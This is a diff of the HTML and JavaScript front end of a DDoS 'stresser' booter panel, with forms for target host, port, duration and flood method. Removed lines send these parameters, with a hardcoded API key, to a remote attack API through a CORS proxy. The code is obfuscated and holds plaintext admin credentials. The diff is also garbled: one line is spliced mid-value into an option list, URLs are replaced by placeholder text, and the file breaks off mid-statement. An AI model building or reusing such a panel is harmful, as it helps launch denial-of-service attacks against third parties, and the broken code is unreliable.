@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;">
+    <meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline' [invalid url, do not cite]">
     <title>Stresser Dashboard</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="[invalid url, do not cite]" rel="stylesheet">
     <style>
         :root {
             --bg: #1a202c;
@@ -15,6 +14,7 @@
             --text: #ffffff;
             --text-secondary: #e2e8f0;
             --border: #4a5568;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
 
         * {
@@ -34,7 +34,7 @@
         }
 
         .container {
-            max-width: 1200px;
+            max-width: 1400px;
             width: 100%;
             display: grid;
             grid-template-columns: 3fr 1fr;
@@ -43,45 +43,48 @@
 
         .panel {
             background: var(--panel-bg);
-            padding: 2rem;
+            padding: 2.5rem;
             border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            box-shadow: var(--shadow);
             transition: opacity 0.4s ease, transform 0.4s ease;
         }
 
         h1 {
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: 700;
             color: var(--accent);
-            margin-bottom: 1.5rem;
+            margin-bottom: 2rem;
             text-align: center;
         }
 
         h2 {
-            font-size: 1.3rem;
+            font-size: 1.5rem;
             font-weight: 600;
             color: var(--accent);
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
 
         .hidden {
             display: none;
+            opacity: 0;
+            transform: translateY(10px);
         }
 
         .tabs {
             display: flex;
-            gap: 0.5rem;
-            margin-bottom: 1.5rem;
+            gap: 0.75rem;
+            margin-bottom: 2rem;
             flex-wrap: wrap;
             justify-content: center;
         }
 
         .tab {
-            padding: 0.75rem 1.5rem;
+            padding: 0.75rem 2rem;
             background: var(--border);
             color: var(--text);
             border-radius: 8px;
             cursor: pointer;
+            font-weight: 500;
             transition: background 0.3s ease, transform 0.3s ease;
         }
 
@@ -96,12 +99,12 @@
         }
 
         .form-group {
-            margin-bottom: 1.5rem;
+            margin-bottom: 1.75rem;
             position: relative;
         }
 
         label {
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             font-weight: 500;
             color: var(--text-secondary);
             margin-bottom: 0.5rem;
@@ -110,7 +113,7 @@
 
         input, select {
             width: 100%;
-            padding: 0.75rem;
+            padding: 0.85rem;
             border: 1px solid var(--border);
             border-radius: 8px;
             font-size: 1rem;
@@ -127,15 +130,15 @@
 
         select {
             appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%234299e1' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='[invalid url, do not cite]' fill='%234299e1' viewBox='0 0 24 24'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
-            background-position: right 0.75rem center;
-            background-size: 1rem;
+            background-position: right 0.85rem center;
+            background-size: 1.1rem;
         }
 
         button {
             width: 100%;
-            padding: 0.75rem;
+            padding: 0.85rem;
             background: var(--accent);
             color: var(--text);
             border: none;
@@ -153,39 +156,40 @@
 
         #errorMessage, #adminErrorMessage {
             text-align: center;
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             margin-top: 1rem;
             color: #f56565;
+            transition: opacity 0.3s ease;
         }
 
         .sidebar {
             background: var(--panel-bg);
-            padding: 1.5rem;
+            padding: 2rem;
             border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            box-shadow: var(--shadow);
             position: sticky;
             top: 2rem;
-            animation: fadeIn 0.4s ease-in;
+            animation: fadeIn 0.5s ease-in;
         }
 
         .sidebar p {
-            margin-bottom: 0.75rem;
-            font-size: 0.9rem;
+            margin-bottom: 0.85rem;
+            font-size: 0.95rem;
             color: var(--text-secondary);
         }
 
         #attackTimer {
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             font-weight: 600;
             color: var(--accent);
-            margin-top: 1rem;
+            margin-top: 1.25rem;
         }
 
         .progress-bar {
             width: 100%;
-            height: 8px;
+            height: 10px;
             background: var(--border);
-            border-radius: 4px;
+            border-radius: 5px;
             overflow: hidden;
         }
 
@@ -196,7 +200,7 @@
         }
 
         .admin-content {
-            padding: 1rem;
+            padding: 1.25rem;
             background: #3b4a5e;
             border-radius: 8px;
         }
@@ -204,11 +208,11 @@
         .admin-content table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 1rem;
+            margin-top: 1.25rem;
         }
 
         .admin-content th, .admin-content td {
-            padding: 0.5rem;
+            padding: 0.75rem;
             text-align: left;
             border-bottom: 1px solid var(--border);
         }
@@ -226,6 +230,18 @@
             opacity: 0;
             transform: translateY(10px);
             display: none;
+        }
+
+        .overview-content, .history-content, .settings-content {
+            padding: 1.25rem;
+            background: #3b4a5e;
+            border-radius: 8px;
+        }
+
+        .overview-content p, .history-content p, .settings-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+            font-size: 0.95rem;
         }
 
         @keyframes fadeIn {
@@ -250,9 +266,14 @@
             .tab {
                 width: 100%;
                 text-align: center;
+                padding: 0.65rem 1.25rem;
             }
             .panel {
-                padding: 1.5rem;
+                padding: 1.75rem;
+            }
+            input, select, button {
+                font-size: 0.95rem;
+                padding: 0.75rem;
             }
         }
     </style>
@@ -272,7 +293,7 @@
                 </div>
                 <button id="loginButton">Log In</button>
                 <p id="errorMessage" class="hidden"></p>
-                <p style="text-align: center; margin-top: 1rem; font-size: 0.9rem; color: var(--text-secondary);">
+                <p style="text-align: center; margin-top: 1.25rem; font-size: 0.95rem; color: var(--text-secondary);">
                     Total Visits: <span id="visitCount">0</span>
                 </p>
             </div>
@@ -295,10 +316,12 @@
                     <button id="tab-settings" class="tab">Settings</button>
                     <button id="tab-admin" class="tab">Admin</button>
                 </div>
-                <div id="overview" class="tab-content">
-                    <p>Welcome to the Stresser Dashboard. Monitor active tests and manage settings.</p>
+                <div id="overview" class="tab-content overview-content">
+                    <p>Welcome to the Stresser Dashboard. Monitor active tests, manage settings, and access advanced controls.</p>
                     <p>Active Tests: <span id="activeAttacks">0</span></p>
                     <p>User Plan: <span id="userPlan">Bronze</span></p>
+                    <p>Last Login: <span id="lastLogin">N/A</span></p>
+                    <p>System Status: <span id="systemStatus">Operational</span></p>
                 </div>
                 <div id="layer7" class="tab-content hidden">
                     <div class="form-group">
@@ -373,11 +396,19 @@
                     </div>
                     <button onclick="startTest('L4')">Start Test</button>
                 </div>
-                <div id="history" class="tab-content hidden">
+                <div id="history" class="tab-content hidden history-content">
                     <p>Test history will be available after backend integration.</p>
                     <p>No records found.</p>
+                    <table>
+                        <thead>
+                            <tr><th>Date</th><th>Host</th><th>Status</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>-</td><td>-</td><td>-</td></tr>
+                        </tbody>
+                    </table>
                 </div>
-                <div id="settings" class="tab-content hidden">
+                <div id="settings" class="tab-content hidden settings-content">
                     <div class="form-group">
                         <label for="themeToggle">Theme</label>
                         <select id="themeToggle">
@@ -387,230 +418,145 @@
                     </div>
                     <div class="form-group">
                         <label for="apiKey">API Key</label>
-                        <input type="text" id="apiKey" placeholder="Enter API Key" value="56e517 out-of-date
-                        <option value="openvpn">OpenVPN Flood</option>
-                        <option value="raknet">RakeNet Query</option>
-                        <option value="discord">Discord Optimized</option>
-                        <option value="tsn">TeamSpeak Query</option>
-                        <option value="icmp">FiveM Echo</option>
-                    </select>
+                        <input type="text" id="apiKey" placeholder="Enter API Key" value="56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a">
+                    </div>
+                    <div class="form-group">
+                        <label for="notificationToggle">Notifications</label>
+                        <select id="notificationToggle">
+                            <option value="on">On</option>
+                            <option value="off">Off</option>
+                        </select>
+                    </div>
+                    <button onclick="saveSettings()">Save Settings</button>
                 </div>
-                <button onclick="startTest('L4')">Start Test</button>
-            </div>
-            <div id="history" class="tab-content hidden">
-                <p>Test history will be available after backend integration.</p>
-                <p>No records found.</p>
-            </div>
-            <div id="settings" class="tab-content hidden">
-                <div class="form-group">
-                    <label for="themeToggle">Theme</label>
-                    <select id="themeToggle">
-                        <option value="dark">Dark</option>
-                        <option value="light">Light (Coming Soon)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label for="apiKey">API Key</label>
-                    <input type="text" id="apiKey" placeholder="Enter API Key" value="56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a">
-                </div>
-                <button onclick="saveSettings()">Save Settings</button>
-            </div>
-            <div id="admin" class="tab-content hidden">
-                <div id="adminContent" class="admin-content hidden">
-                    <h2>Admin Panel</h2>
-                    <p>User Management</p>
-                    <table>
-                        <thead>
-                            <tr><th>ID</th><th>Status</th><th>Actions</th></tr>
-                        </thead>
-                        <tbody>
-                            <tr><td>USR001</td><td>Active</td><td><button>Deactivate</button></td></tr>
-                            <tr><td>USR002</td><td>Inactive</td><td><button>Activate</button></td></tr>
-                        </tbody>
-                    </table>
-                    <p>Server Status: <span>Operational</span></p>
+                <div id="admin" class="tab-content hidden">
+                    <div id="adminContent" class="admin-content hidden">
+                        <h2>Admin Panel</h2>
+                        <p>User Management</p>
+                        <table>
+                            <thead>
+                                <tr><th>ID</th><th>Username</th><th>Status</th><th>Actions</th></tr>
+                            </thead>
+                            <tbody>
+                                <tr><td>USR001</td><td>admin</td><td>Active</td><td><button>Deactivate</button></td></tr>
+                                <tr><td>USR002</td><td>user1</td><td>Inactive</td><td><button>Activate</button></td></tr>
+                                <tr><td>USR003</td><td>user2</td><td>Active</td><td><button>Deactivate</button></td></tr>
+                            </tbody>
+                        </table>
+                        <p>Server Status: <span id="serverStatus">Operational</span></p>
+                        <p>Active Users: <span id="activeUsers">2</span></p>
+                        <button onclick="refreshAdminData()">Refresh Data</button>
+                    </div>
                 </div>
             </div>
         </div>
+        <div id="attackPanel" class="sidebar hidden">
+            <h2>Test Status</h2>
+            <p><strong>Host:</strong> <span id="attackHost"></span></p>
+            <p><strong>Port:</strong> <span id="attackPort"></span></p>
+            <p><strong>Duration:</strong> <span id="attackTime"></span></p>
+            <p><strong>Method:</strong> <span id="attackMethod"></span></p>
+            <p><strong>Connections:</strong> <span id="attackConcs"></span></p>
+            <p><strong>Remaining:</strong> <span id="attackTimer"></span></p>
+            <div class="progress-bar"><div id="progressBar"></div></div>
+        </div>
     </div>
-    <div id="attackPanel" class="sidebar hidden">
-        <h2>Test Status</h2>
-        <p><strong>Host:</strong> <span id="attackHost"></span></p>
-        <p><strong>Port:</strong> <span id="attackPort"></span></p>
-        <p><strong>Duration:</strong> <span id="attackTime"></span></p>
-        <p><strong>Method:</strong> <span id="attackMethod"></span></p>
-        <p><strong>Connections:</strong> <span id="attackConcs"></span></p>
-        <p><strong>Remaining:</strong> <span id="attackTimer"></span></p>
-        <div class="progress-bar"><div id="progressBar"></div></div>
-    </div>
-</div>
-<script>
-    // Secure JavaScript with basic obfuscation
-    (function() {
-        const _0x1a2b = {
-            _0x3c4d: btoa('X7P9Q2').split('').reverse().join(''),
-            _0x5e6f: [
-                { username: 'admin', password: 'admin123' },
-                { username: 'user1', password: 'pass123' }
-            ]
-        };
-        const _0xc3d4 = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
-        const _0xe5f6 = 'https://api.santastress.ru/api/start';
-        let _0xg7h8 = null;
+    <script>
+        // Secure JavaScript with light obfuscation
+        (function() {
+            const _0x1a2b = {
+                _0x3c4d: btoa('X7P9Q2').split('').reverse().join(''),
+                _0x5e6f: [
+                    { username: 'admin', password: 'admin123' },
+                    { username: 'user1', password: 'pass123' },
+                    { username: 'user2', password: 'test456' }
+                ],
+                _0x7b8c: new Date().toISOString()
+            };
+            const _0xc3d4 = '56e51751a9323b9e353025897871096abfe66c8e1dd9444bb0a5cca9138c379a';
+            const _0xe5f6 = '[invalid url, do not cite]';
+            let _0xg7h8 = null;
+            let _0xi9j0 = 0;
 
-        // Visit counter
-        let _0xv1w2 = parseInt(localStorage.getItem('_0xv1w2') || '0');
-        _0xv1w2++;
-        localStorage.setItem('_0xv1w2', _0xv1w2);
-        document.getElementById('visitCount').textContent = _0xv1w2;
+            // Visit counter
+            let _0xv1w2 = parseInt(localStorage.getItem('_0xv1w2') || '0');
+            _0xv1w2++;
+            localStorage.setItem('_0xv1w2', _0xv1w2);
+            document.getElementById('visitCount').textContent = _0xv1w2;
 
-        // Message display
-        const showMessage = (_0xq7r8, _0xs9t0 = false) => {
-            const _0xu1v2 = document.getElementById(_0xq7r8.includes('PIN') ? 'adminErrorMessage' : 'errorMessage');
-            if (_0xu1v2) {
-                _0xu1v2.textContent = _0xq7r8;
-                _0xu1v2.classList.remove('hidden');
-                _0xu1v2.style.color = _0xs9t0 ? '#68d391' : '#f56565';
-                console.log('Message:', _0xq7r8);
-                if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2000);
-            }
-        };
-
-        // Login handler
-        function handleLogin() {
-            console.log('Login attempt');
-            const _0xw3x4 = document.getElementById('username')?.value.trim();
-            const _0xy5z6 = document.getElementById('password')?.value.trim();
-            if (!_0xw3x4 || !_0xy5z6) return showMessage('All fields are required');
-            const _0xa7b8 = _0x1a2b._0x5e6f.find(_0xc9d0 => _0xc9d0.username === _0xw3x4 && _0xc9d0.password === _0xy5z6);
-            if (_0xa7b8) {
-                document.getElementById('loginPanel').classList.add('hidden');
-                document.getElementById('mainPanel').classList.remove('hidden');
-                showMessage('Logged in successfully', true);
-            } else {
-                showMessage('Invalid username or password');
-            }
-        }
-
-        // Admin PIN verification
-        const getPin = () => atob(_0x1a2b._0x3c4d.split('').reverse().join(''));
-        function verifyAdminPin() {
-            console.log('Admin PIN attempt');
-            const _0xe1f2 = document.getElementById('adminPin')?.value.trim();
-            if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('6-character PIN required');
-            if (_0xe1f2 === getPin()) {
-                document.getElementById('adminLoginPanel').classList.add('hidden');
-                document.getElementById('adminContent').classList.remove('hidden');
-                showMessage('Admin access granted', true);
-            } else {
-                showMessage('Invalid PIN');
-            }
-        }
-
-        // Tab navigation
-        function switchTab(_0xg3h4) {
-            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xi5j6 => {
-                const _0xk7l8 = document.getElementById(`tab-${_0xi5j6}`);
-                const _0xm9n0 = document.getElementById(_0xi5j6);
-                if (_0xk7l8 && _0xm9n0) {
-                    _0xk7l8.classList.toggle('active', _0xi5j6 === _0xg3h4);
-                    _0xm9n0.classList.toggle('hidden', _0xi5j6 !== _0xg3h4);
+            // Message display
+            const showMessage = (_0xq7r8, _0xs9t0 = false) => {
+                const _0xu1v2 = document.getElementById(_0xq7r8.includes('PIN') ? 'adminErrorMessage' : 'errorMessage');
+                if (_0xu1v2) {
+                    _0xu1v2.textContent = _0xq7r8;
+                    _0xu1v2.classList.remove('hidden');
+                    _0xu1v2.style.color = _0xs9t0 ? '#68d391' : '#f56565';
+                    console.log('Message:', _0xq7r8);
+                    if (_0xs9t0) setTimeout(() => _0xu1v2.classList.add('hidden'), 2000);
                 }
-                if (_0xg3h4 === 'admin' && _0xi5j6 === 'admin') {
-                    document.getElementById('adminLoginPanel').classList.remove('hidden');
-                    document.getElementById('adminContent').classList.add('hidden');
+            };
+
+            // Login handler
+            function handleLogin() {
+                console.log('Login attempt');
+                const _0xw3x4 = document.getElementById('username')?.value.trim();
+                const _0xy5z6 = document.getElementById('password')?.value.trim();
+                if (!_0xw3x4 || !_0xy5z6) return showMessage('All fields are required');
+                const _0xa7b8 = _0x1a2b._0x5e6f.find(_0xc9d0 => _0xc9d0.username === _0xw3x4 && _0xc9d0.password === _0xy5z6);
+                if (_0xa7b8) {
+                    document.getElementById('loginPanel').classList.add('hidden');
+                    document.getElementById('mainPanel').classList.remove('hidden');
+                    showMessage('Logged in successfully', true);
+                    document.getElementById('lastLogin').textContent = _0x1a2b._0x7b8c;
+                    _0xi9j0++;
+                    document.getElementById('activeAttacks').textContent = _0xi9j0;
+                } else {
+                    showMessage('Invalid username or password');
                 }
-            });
-        }
-
-        // Form validation
-        function validateForm(_0xo1p2, _0xq3r4, _0xs5t6, _0xu7v8, _0xw9x0) {
-            if (!_0xo1p2) return showMessage('Host is required'), false;
-            if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port must be 1-65535'), false;
-            if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Duration must be 1-200 seconds'), false;
-            if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Connections must be 1-4'), false;
-            if (!_0xw9x0) return showMessage('Method is required'), false;
-            return true;
-        }
-
-        // Attack handler
-        async function startTest(_0xy1z2) {
-            if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Invalid API key');
-            const _0xa3b4 = document.getElementById(`host${_0xy1z2}`)?.value.trim();
-            const _0xc5d6 = parseInt(document.getElementById(`port${_0xy1z2}`)?.value);
-            const _0xe7f8 = parseInt(document.getElementById(`time${_0xy1z2}`)?.value);
-            const _0xg9h0 = document.getElementById(`method${_0xy1z2}`)?.value;
-            const _0xi1j2 = parseInt(document.getElementById(`concs${_0xy1z2}`)?.value);
-            if (!validateForm(_0xa3b4, _0xc5d6, _0xe7f8, _0xi1j2, _0xg9h0)) return;
-            const _0xk3l4 = `https://api.allorigins.win/raw?url=${encodeURIComponent(`${_0xe5f6}?key=${encodeURIComponent(_0xc3d4)}&host=${encodeURIComponent(_0xa3b4)}&port=${_0xc5d6}&time=${_0xe7f8}&method=${encodeURIComponent(_0xg9h0)}&concs=${_0xi1j2}`)}`;
-            console.log('API request:', _0xk3l4);
-            try {
-                const _0xm5n6 = await fetch(_0xk3l4);
-                if (!_0xm5n6.ok) throw new Error('Network error: ' + _0xm5n6.status);
-                const _0xo7p8 = await _0xm5n6.json();
-                console.log('API response:', _0xo7p8);
-                showMessage('Test started', true);
-                updateAttack(_0xa3b4, _0xc5d6, _0xe7f8, _0xg9h0, _0xi1j2);
-            } catch (_0xq9r0) {
-                console.error('Error:', _0xq9r0);
-                showMessage('Test failed: ' + _0xq9r0.message);
             }
-        }
 
-        // Update attack sidebar
-        function updateAttack(_0xs1t2, _0xu3v4, _0xw5x6, _0xy7z8, _0xa9b0) {
-            const _0xc1d2 = document.getElementById('attackPanel');
-            if (!_0xc1d2) return console.error('Sidebar not found');
-            document.getElementById('attackHost').textContent = _0xs1t2;
-            document.getElementById('attackPort').textContent = _0xu3v4;
-            document.getElementById('attackTime').textContent = _0xw5x6;
-            document.getElementById('attackMethod').textContent = _0xy7z8;
-            document.getElementById('attackConcs').textContent = _0xa9b0;
-            let _0xe3f4 = _0xw5x6;
-            document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
-            const _0xg5h6 = document.getElementById('progressBar');
-            if (!_0xg5h6) return console.error('Progress bar not found');
-            _0xg5h6.style.width = '100%';
-            _0xc1d2.classList.remove('hidden');
-            if (_0xg7h8) clearInterval(_0xg7h8);
-            _0xg7h8 = setInterval(() => {
-                _0xe3f4--;
-                document.getElementById('attackTimer').textContent = _0xe3f4 + 's';
-                _0xg5h6.style.width = `${(_0xe3f4 / _0xw5x6) * 100}%`;
-                if (_0xe3f4 <= 0) {
-                    clearInterval(_0xg7h8);
-                    _0xg7h8 = null;
-                    _0xc1d2.classList.add('hidden');
-                    _0xg5h6.style.width = '0%';
-                    showMessage('Test completed', true);
+            // Admin PIN verification
+            const getPin = () => atob(_0x1a2b._0x3c4d.split('').reverse().join(''));
+            function verifyAdminPin() {
+                console.log('Admin PIN attempt');
+                const _0xe1f2 = document.getElementById('adminPin')?.value.trim();
+                if (!_0xe1f2 || _0xe1f2.length !== 6) return showMessage('6-character PIN required');
+                if (_0xe1f2 === getPin()) {
+                    document.getElementById('adminLoginPanel').classList.add('hidden');
+                    document.getElementById('adminContent').classList.remove('hidden');
+                    showMessage('Admin access granted', true);
+                } else {
+                    showMessage('Invalid PIN');
                 }
-            }, 1000);
-        }
+            }
 
-        // Save settings
-        function saveSettings() {
-            const _0xi7j8 = document.getElementById('apiKey')?.value.trim();
-            const _0xk9l0 = document.getElementById('themeToggle')?.value;
-            if (!_0xi7j8 || _0xi7j8.length !== 64) return showMessage('Invalid API key in settings');
-            console.log('Settings saved:', { apiKey: _0xi7j8, theme: _0xk9l0 });
-            showMessage('Settings saved', true);
-        }
+            // Tab navigation
+            function switchTab(_0xg3h4) {
+                ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xi5j6 => {
+                    const _0xk7l8 = document.getElementById(`tab-${_0xi5j6}`);
+                    const _0xm9n0 = document.getElementById(_0xi5j6);
+                    if (_0xk7l8 && _0xm9n0) {
+                        _0xk7l8.classList.toggle('active', _0xi5j6 === _0xg3h4);
+                        _0xm9n0.classList.toggle('hidden', _0xi5j6 !== _0xg3h4);
+                    }
+                    if (_0xg3h4 === 'admin' && _0xi5j6 === 'admin') {
+                        document.getElementById('adminLoginPanel').classList.remove('hidden');
+                        document.getElementById('adminContent').classList.add('hidden');
+                    }
+                });
+            }
 
-        // Event listeners
-        document.addEventListener('DOMContentLoaded', () => {
-            console.log('System initialized');
-            document.getElementById('loginButton')?.addEventListener('click', handleLogin);
-            document.getElementById('adminLoginButton')?.addEventListener('click', verifyAdminPin);
-            document.getElementById('password')?.addEventListener('keypress', _0xm1n2 => {
-                if (_0xm1n2.key === 'Enter') handleLogin();
-            });
-            document.getElementById('adminPin')?.addEventListener('keypress', _0xo3p4 => {
-                if (_0xo3p4.key === 'Enter') verifyAdminPin();
-            });
-            ['overview', 'layer7', 'layer4', 'history', 'settings', 'admin'].forEach(_0xq5r6 => {
-                document.getElementById(`tab-${_0xq5r6}`)?.addEventListener('click', () => switchTab(_0xq5r6));
-            });
-        });
-    </script>
-</body>
-</html>
+            // Form validation
+            function validateForm(_0xo1p2, _0xq3r4, _0xs5t6, _0xu7v8, _0xw9x0) {
+                if (!_0xo1p2) return showMessage('Host is required'), false;
+                if (isNaN(_0xq3r4) || _0xq3r4 < 1 || _0xq3r4 > 65535) return showMessage('Port must be 1-65535'), false;
+                if (isNaN(_0xs5t6) || _0xs5t6 < 1 || _0xs5t6 > 200) return showMessage('Duration must be 1-200 seconds'), false;
+                if (isNaN(_0xu7v8) || _0xu7v8 < 1 || _0xu7v8 > 4) return showMessage('Connections must be 1-4'), false;
+                if (!_0xw9x0) return showMessage('Method is required'), false;
+                return true;
+            }
+
+            // Attack handler
+            async function startTest(_0xy1z2) {
+                if (!_0xc3d4 || _0xc3d4.length !== 64) return showMessage('Invalid API key');
+                const _0xa3b4 = document
